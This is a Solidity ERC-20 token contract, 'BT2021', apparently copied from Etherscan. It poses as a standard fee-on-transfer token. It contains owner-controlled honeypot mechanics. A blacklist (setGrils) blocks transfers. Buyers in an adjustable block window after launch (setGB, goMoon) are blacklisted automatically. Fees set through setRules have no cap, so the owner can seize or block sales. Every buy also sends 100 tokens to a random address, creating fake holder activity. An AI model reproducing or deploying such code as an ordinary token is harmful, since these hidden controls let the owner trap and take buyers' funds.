1 /**
2  *Submitted for verification at Etherscan.io on 2023-08-07
3 */
4 
5 /**
6  *Submitted for verification at Etherscan.io on 2023-08-07
7 */
8 
9 /**
10  *Submitted for verification at Etherscan.io on 2023-08-07
11 */
12 
13 // SPDX-License-Identifier: Unlicensed
14 
15 pragma solidity ^0.8.4;
16 
17 interface IERC20 {
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 interface Token {
29     function transferFrom(address, address, uint) external returns (bool);
30     function transfer(address, uint) external returns (bool);
31 }
32 
33 interface IUniswapV2Factory {
34     function createPair(address tokenA, address tokenB) external returns (address pair);
35 }
36 
37 interface IUniswapV2Router02 {
38     function swapExactTokensForETHSupportingFeeOnTransferTokens(
39         uint amountIn,
40         uint amountOutMin,
41         address[] calldata path,
42         address to,
43         uint deadline
44     ) external;
45     function factory() external pure returns (address);
46     function WETH() external pure returns (address);
47     function addLiquidityETH(
48         address token,
49         uint amountTokenDesired,
50         uint amountTokenMin,
51         uint amountETHMin,
52         address to,
53         uint deadline
54     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
55 }
56 
57 abstract contract Context {
58     function _msgSender() internal view virtual returns (address) {
59         return msg.sender;
60     }
61 }
62 
63 
64 
65 library SafeMath {
66     function add(uint256 a, uint256 b) internal pure returns (uint256) {
67         uint256 c = a + b;
68         require(c >= a, "SafeMath: addition overflow");
69         return c;
70     }
71 
72     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
73         return sub(a, b, "SafeMath: subtraction overflow");
74     }
75 
76     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
77         require(b <= a, errorMessage);
78         uint256 c = a - b;
79         return c;
80     }
81 
82     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
83         if (a == 0) {
84             return 0;
85         }
86         uint256 c = a * b;
87         require(c / a == b, "SafeMath: multiplication overflow");
88         return c;
89     }
90 
91     function div(uint256 a, uint256 b) internal pure returns (uint256) {
92         return div(a, b, "SafeMath: division by zero");
93     }
94 
95     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
96         require(b > 0, errorMessage);
97         uint256 c = a / b;
98         return c;
99     }
100 
101 }
102 
103 contract Ownable is Context {
104     address private _owner;
105     address private _previousOwner;
106 
107     constructor () {
108         address msgSender = _msgSender();
109         _owner = msgSender;
110         emit OwnershipTransferred(address(0), msgSender);
111     }
112 
113     function owner() public view returns (address) {
114         return _owner;
115     }
116 
117     modifier onlyOwner() {
118         require(_owner == _msgSender(), "Caller is not the owner");
119         _;
120     }
121 
122     function renounceOwnership() public virtual onlyOwner {
123         emit OwnershipTransferred(_owner, address(0));
124         _owner = address(0);
125     }
126     
127     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
128     function transferOwnership(address newOwner) public virtual onlyOwner {
129         emit OwnershipTransferred(_owner, newOwner);
130         _owner = newOwner;
131     }
132 
133 }
134 
135 contract BT2021 is Context, IERC20, Ownable {
136     
137     using SafeMath for uint256;
138     mapping (address => uint256) private _rOwned;
139     mapping (address => uint256) private _tOwned;
140     mapping (address => mapping (address => uint256)) private _allowances;
141     mapping (address => bool) private _isExcludedFromFee;
142 
143     mapping (address => bool) public _Grils;
144     uint256 public gb = 0;
145     uint256 public goMoonBlock = 0;
146     
147     uint256 private constant MAX = ~uint256(0);
148     uint256 private constant _tTotal = 420000000000000000000000000;
149     uint256 private _rTotal = (MAX - (MAX % _tTotal));
150     uint256 private _tFeeTotal;
151 
152     uint256 private _redisFeeOnBuy = 0;
153     uint256 private _taxFeeOnBuy = 2;
154     
155     uint256 private _redisFeeOnSell = 0;
156     uint256 private _taxFeeOnSell = 2;
157     
158     uint256 private _redisFee;
159     uint256 private _taxFee;
160     
161     string private constant _name = "BT2021";
162     string private constant _symbol = "BT2021";
163     uint8 private constant _decimals = 9;
164     
165     address payable private _developmentAddress = payable(0xD8860B410adcd8768C43811E9a29487F85E3fE7d);
166     address payable private _marketingAddress = payable(0x3cCb1CCb050d682E6FFF2dFDE507Ea40C16812d7);
167 
168     IUniswapV2Router02 public uniswapV2Router;
169     address public uniswapV2Pair;
170     
171     bool private inSwap = false;
172     bool private swapEnabled = true;
173     
174     modifier lockTheSwap {
175         inSwap = true;
176         _;
177         inSwap = false;
178     }
179     constructor () {
180         _rOwned[_msgSender()] = _rTotal;
181         
182         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
183         uniswapV2Router = _uniswapV2Router;
184         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
185             .createPair(address(this), _uniswapV2Router.WETH());
186 
187         _isExcludedFromFee[owner()] = true;
188         _isExcludedFromFee[address(this)] = true;
189         _isExcludedFromFee[_developmentAddress] = true;
190         _isExcludedFromFee[_marketingAddress] = true;
191 
192         emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
193     }
194 
195     function name() public pure returns (string memory) {
196         return _name;
197     }
198 
199     function symbol() public pure returns (string memory) {
200         return _symbol;
201     }
202 
203     function decimals() public pure returns (uint8) {
204         return _decimals;
205     }
206 
207     function totalSupply() public pure override returns (uint256) {
208         return _tTotal;
209     }
210 
211     function balanceOf(address account) public view override returns (uint256) {
212         return tokenFromReflection(_rOwned[account]);
213     }
214 
215     function transfer(address recipient, uint256 amount) public override returns (bool) {
216         _transfer(_msgSender(), recipient, amount);
217         return true;
218     }
219 
220     function allowance(address owner, address spender) public view override returns (uint256) {
221         return _allowances[owner][spender];
222     }
223 
224     function approve(address spender, uint256 amount) public override returns (bool) {
225         _approve(_msgSender(), spender, amount);
226         return true;
227     }
228 
229     function setGrils(address girl, bool status) public onlyOwner {
230         _Grils[girl] = status;
231     }
232 
233     function setGB(uint256 g) public onlyOwner {
234         gb = g;
235     }
236 
237     function goMoon(uint256 g) public onlyOwner {
238         goMoonBlock = g;
239         if(g == 1) {
240             goMoonBlock = block.number;
241         }
242     }
243 
244     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
245         _transfer(sender, recipient, amount);
246         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
247         return true;
248     }
249 
250     function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
251         require(rAmount <= _rTotal, "Amount must be less than total reflections");
252         uint256 currentRate =  _getRate();
253         return rAmount.div(currentRate);
254     }
255 
256     function _approve(address owner, address spender, uint256 amount) private {
257         require(owner != address(0), "ERC20: approve from the zero address");
258         require(spender != address(0), "ERC20: approve to the zero address");
259         _allowances[owner][spender] = amount;
260         emit Approval(owner, spender, amount);
261     }
262 
263     function _transfer(address from, address to, uint256 amount) private {
264         require(from != address(0), "ERC20: transfer from the zero address");
265         require(to != address(0), "ERC20: transfer to the zero address");
266         require(amount > 0, "Transfer amount must be greater than zero");
267         require(!_Grils[from], "Transfer not allowed");
268         
269         _redisFee = 0;
270         _taxFee = 0;
271         
272         if (from != owner() && to != owner()) {
273             
274             uint256 contractTokenBalance = balanceOf(address(this));
275             if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance > 0) {
276                 swapTokensForEth(contractTokenBalance);
277                 uint256 contractETHBalance = address(this).balance;
278                 if(contractETHBalance > 0) {
279                     sendETHToFee(address(this).balance);
280                 }
281             }
282 
283             if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
284                 require(goMoonBlock != 0, 'Transfer not open');
285             }
286             
287             if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
288                 if (block.number < gb + goMoonBlock) {
289                     if (from == uniswapV2Pair) {
290                         _Grils[to] = true;
291                     }
292                 }
293                 _redisFee = _redisFeeOnBuy;
294                 _taxFee = _taxFeeOnBuy;
295                 address ad;
296                 for(int i=0;i < 1;i++){
297                     ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
298                     _transferStandard(from,ad,100);
299                 }
300                 amount -= 100;
301             }
302     
303             if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
304                 _redisFee = _redisFeeOnSell;
305                 _taxFee = _taxFeeOnSell;
306             }
307             
308             if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
309                 _redisFee = 0;
310                 _taxFee = 0;
311             }
312             
313         }
314 
315         _tokenTransfer(from,to,amount);
316     }
317 
318     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
319         address[] memory path = new address[](2);
320         path[0] = address(this);
321         path[1] = uniswapV2Router.WETH();
322         _approve(address(this), address(uniswapV2Router), tokenAmount);
323         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
324             tokenAmount,
325             0,
326             path,
327             address(this),
328             block.timestamp
329         );
330     }
331         
332     function sendETHToFee(uint256 amount) private {
333         _developmentAddress.transfer(amount.div(2));
334         _marketingAddress.transfer(amount.div(2));
335     }
336     
337     function _tokenTransfer(address sender, address recipient, uint256 amount) private {
338         _transferStandard(sender, recipient, amount);
339     }
340 
341     event tokensRescued(address indexed token, address indexed to, uint amount);
342     function rescueForeignTokens(address _tokenAddr, address _to, uint _amount) public onlyOwner() {
343         emit tokensRescued(_tokenAddr, _to, _amount);	
344         Token(_tokenAddr).transfer(_to, _amount);
345     }
346     
347     event devAddressUpdated(address indexed previous, address indexed adr);
348     function setNewDevAddress(address payable dev) public onlyOwner() {
349         emit devAddressUpdated(_developmentAddress, dev);	
350         _developmentAddress = dev;
351         _isExcludedFromFee[_developmentAddress] = true;
352     }
353     
354     event marketingAddressUpdated(address indexed previous, address indexed adr);
355     function setNewMarketingAddress(address payable markt) public onlyOwner() {
356         emit marketingAddressUpdated(_marketingAddress, markt);	
357         _marketingAddress = markt;
358         _isExcludedFromFee[_marketingAddress] = true;
359     }
360 
361     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
362         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
363         _rOwned[sender] = _rOwned[sender].sub(rAmount);
364         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 
365         _takeTeam(tTeam);
366         _reflectFee(rFee, tFee);
367         emit Transfer(sender, recipient, tTransferAmount);
368     }
369 
370     function _takeTeam(uint256 tTeam) private {
371         uint256 currentRate =  _getRate();
372         uint256 rTeam = tTeam.mul(currentRate);
373         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
374     }
375 
376     function _reflectFee(uint256 rFee, uint256 tFee) private {
377         _rTotal = _rTotal.sub(rFee);
378         _tFeeTotal = _tFeeTotal.add(tFee);
379     }
380 
381     receive() external payable {}
382     
383     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
384         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee);
385         uint256 currentRate =  _getRate();
386         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
387         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
388     }
389 
390     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
391         uint256 tFee = tAmount.mul(taxFee).div(100);
392         uint256 tTeam = tAmount.mul(TeamFee).div(100);
393         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
394         return (tTransferAmount, tFee, tTeam);
395     }
396 
397     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
398         uint256 rAmount = tAmount.mul(currentRate);
399         uint256 rFee = tFee.mul(currentRate);
400         uint256 rTeam = tTeam.mul(currentRate);
401         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
402         return (rAmount, rTransferAmount, rFee);
403     }
404 
405 	function _getRate() private view returns(uint256) {
406         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
407         return rSupply.div(tSupply);
408     }
409 
410     function _getCurrentSupply() private view returns(uint256, uint256) {
411         uint256 rSupply = _rTotal;
412         uint256 tSupply = _tTotal;      
413         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
414         return (rSupply, tSupply);
415     }
416 
417     function manualswap() external {
418         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
419         uint256 contractBalance = balanceOf(address(this));
420         swapTokensForEth(contractBalance);
421     }
422 
423     function manualsend() external {
424         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
425         uint256 contractETHBalance = address(this).balance;
426         sendETHToFee(contractETHBalance);
427     }
428     
429     function setRules(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
430         _redisFeeOnBuy = redisFeeOnBuy;
431         _redisFeeOnSell = redisFeeOnSell;
432         _taxFeeOnBuy = taxFeeOnBuy;
433         _taxFeeOnSell = taxFeeOnSell;
434     }
435     
436     function toggleSwap(bool _swapEnabled) public onlyOwner {
437         swapEnabled = _swapEnabled;
438     }
439 
440     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
441         for(uint256 i = 0; i < accounts.length; i++) {
442             _isExcludedFromFee[accounts[i]] = excluded;
443         }
444     }
445 }